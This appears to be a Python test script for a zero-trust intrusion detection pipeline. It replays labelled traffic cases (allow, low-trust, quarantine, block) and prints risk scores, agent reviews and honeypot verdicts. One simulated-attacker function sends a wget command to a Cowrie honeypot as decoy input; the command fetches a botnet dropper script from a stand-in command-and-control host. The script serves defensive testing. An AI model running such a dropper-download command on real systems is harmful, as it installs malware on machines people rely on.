import asyncio
import pandas as pd
from backend.pipeline import process_flow
from honeypot_redirect import simulate_honeypot_attacker_action

async def async_attacker_payload():
    """Simulates an attacker attempting an exploit payload inside the Cowrie honeypot."""
    await asyncio.sleep(1.2)
    success, out = simulate_honeypot_attacker_action("wget http://malicious-c2.net/botnet_dropper.sh -O /tmp/dropper.sh")
    if success:
        print("[Attacker Sim] Successfully executed decoy exploit command 'wget ...' inside Cowrie SSH honeypot")
    else:
        print(f"[Attacker Sim] Note: Cowrie direct execution ({out})")

async def main():
    df = pd.read_csv("data/replay_final.csv")
    benign_row = df[df["true_label"] == "Normal Traffic"].iloc[0].to_dict()
    attack_row = df[df["true_label"] == "DDoS"].iloc[0].to_dict()
    quarantine_row = df[df["true_label"] == "Bots"].iloc[12].to_dict()

    test_cases = [
        ("ALLOW-CASE", {**benign_row, "flow_id": "test-allow", "source_ip": "198.51.100.10",
                         "mfa_on": True, "device_healthy": True, "known_location": True, "normal_hours": True}, False),
        ("LOW-TRUST-CASE", {**benign_row, "flow_id": "test-lowtrust", "source_ip": "198.51.100.11",
                             "mfa_on": False, "device_healthy": False, "known_location": True, "normal_hours": True}, False),
        ("QUARANTINE-CASE", {**quarantine_row, "flow_id": "test-quarantine", "source_ip": "198.51.100.13",
                              "mfa_on": True, "device_healthy": False, "known_location": True, "normal_hours": True}, False),
        ("HONEYPOT-FEEDBACK-BLOCK-CASE", {**quarantine_row, "flow_id": "test-honey-feedback", "source_ip": "198.51.100.14",
                                          "mfa_on": True, "device_healthy": False, "known_location": True, "normal_hours": True}, True),
        ("BLOCK-CASE", {**attack_row, "flow_id": "test-block", "source_ip": "198.51.100.12",
                         "mfa_on": True, "device_healthy": True, "known_location": True, "normal_hours": True}, False),
    ]

    for label, row, trigger_exploit in test_cases:
        print(f"\n{'='*60}\n{label}\n{'='*60}")
        if trigger_exploit:
            asyncio.create_task(async_attacker_payload())
        result = await process_flow(row)
        print(f"Action: {result['action']}")
        print(f"Risk score: {result['fused_risk_score']}")
        print(f"Explanation: {result['explanation']}")
        print(f"Reason: {result['reason']}")
        if result.get("agent_review"):
            ar = result["agent_review"]
            print(f"Agent: tool={ar.get('tool_called')} overridden={ar.get('overridden')} -> {ar.get('agent_reason')}")
        else:
            print("Agent: not invoked (action wasn't borderline)")
        if result.get("honeypot_verdict"):
            hv = result["honeypot_verdict"]
            print(f"Honeypot Watcher: verdict={hv.get('final_verdict')} -> {hv.get('reason')}")

    await asyncio.sleep(2)

asyncio.run(main())
